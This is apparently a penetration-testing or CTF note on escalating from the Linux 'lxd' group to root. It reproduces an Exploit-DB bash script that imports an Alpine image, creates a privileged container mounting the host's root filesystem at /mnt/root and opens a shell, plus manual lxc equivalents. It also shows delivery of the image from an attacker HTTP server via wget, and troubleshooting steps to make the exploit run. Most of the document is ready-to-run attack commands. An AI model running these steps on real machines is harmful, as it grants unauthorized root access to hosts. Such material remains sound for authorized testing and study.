
**LxD** is a container hypervisor that manages Linux system containers. If a user is part of the `lxd` group, it can be a critical security risk—because it grants them the ability to create and manage containers. With some clever exploitation, this can lead to **privilege escalation to root**.

When a user is in the `lxd` group, they can:

- Initialize containers
- Import custom container images
- Mount host directories inside containers

First, we need to prepare an **Alpine Linux image** for LXD. Alpine is a minimal Linux distribution that’s perfect for this purpose

**Clone the builder repo** (in attacker machine)

```
git clone https://github.com/saghul/lxd-alpine-builder  
cd lxd-alpine-builder
sudo ./build-alpine
```

it generates .tar.gz file. For example,

`-rw-r--r-- 1 root root 4139283 Jul 16 05:58 alpine-v3.24-x86_64-20260716_0558.tar.gz`

**Deliver the Tar file to target machine**

`python3 -m http.server`           (host server)

`wget http://10.10.16.241:8080/alpine-v3.24-x86_64-20260716_0558.tar.gz`  (delivering to target machine)

**Ubuntu 18.04 - 'lxd' Privilege Escalation**

Ref : https://www.exploit-db.com/exploits/46978

```
#!/usr/bin/env bash

# ----------------------------------
# Authors: Marcelo Vazquez (S4vitar)
#	   Victor Lasa      (vowkin)
# ----------------------------------

# Step 1: Download build-alpine => wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine [Attacker Machine]
# Step 2: Build alpine => bash build-alpine (as root user) [Attacker Machine]
# Step 3: Run this script and you will get root [Victim Machine]
# Step 4: Once inside the container, navigate to /mnt/root to see all resources from the host machine

function helpPanel(){
  echo -e "\nUsage:"
  echo -e "\t[-f] Filename (.tar.gz alpine file)"
  echo -e "\t[-h] Show this help panel\n"
  exit 1
}

function createContainer(){
  lxc image import $filename --alias alpine && lxd init --auto
  echo -e "[*] Listing images...\n" && lxc image list
  lxc init alpine privesc -c security.privileged=true
  lxc config device add privesc giveMeRoot disk source=/ path=/mnt/root recursive=true
  lxc start privesc
  lxc exec privesc sh
  cleanup
}

function cleanup(){
  echo -en "\n[*] Removing container..."
  lxc stop privesc && lxc delete privesc && lxc image delete alpine
  echo " [√]"
}

set -o nounset
set -o errexit

declare -i parameter_enable=0; while getopts ":f:h:" arg; do
  case $arg in
    f) filename=$OPTARG && let parameter_enable+=1;;
    h) helpPanel;;
  esac
done

if [ $parameter_enable -ne 1 ]; then
  helpPanel
else
  createContainer
fi
            
```

Save it as exploit.sh in the target machine.

```
nano exploit.sh
chmod +x exploit.sh

./exploit.sh -f alpine-v3.24-x86_64-20260716_0558.tar.gz
```

(or)

We can import it manually using lxc : https://www.hackingarticles.in/lxd-privilege-escalation/

`lxc image import ./alpine-v3.24-x86_64-20260716_0558.tar.gz --alias alpine`

```
lxc init alpine ignite -c security.privileged=true       (to get root)
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
```

During exploitation, we might face certain errors

1. If we encounter, lxc or lxd : command not found error, need to find the path of it

```
whereis lxc
which lxc  

find / -type f -name "lxc" 2>/dev/null
```

![](../Pasted%20image%2020260716160411.png)

Have to add this into our PATH

`export PATH=$PATH:/snap/lxd/21468/bin:/snap/lxd/21468/commands`

Now, it will be resolved

2. If we face `Error: Get "http://unix.socket/1.0": dial unix /var/lib/lxd/unix.socket: connect: no such file or directory`

The fix:

```
export LXD_DIR=/var/snap/lxd/common/lxd
/snap/lxd/21468/bin/lxc image list
```

3. If we face `lxd: error while loading shared libraries: liblxc.so.1: cannot open shared object file: No such file or directory`

`/snap/bin/lxc image list`

4. If we face Error: No storage pool found. Please create a new storage pool

`/snap/bin/lxd init --auto`

Now, all the issues will be resolved.
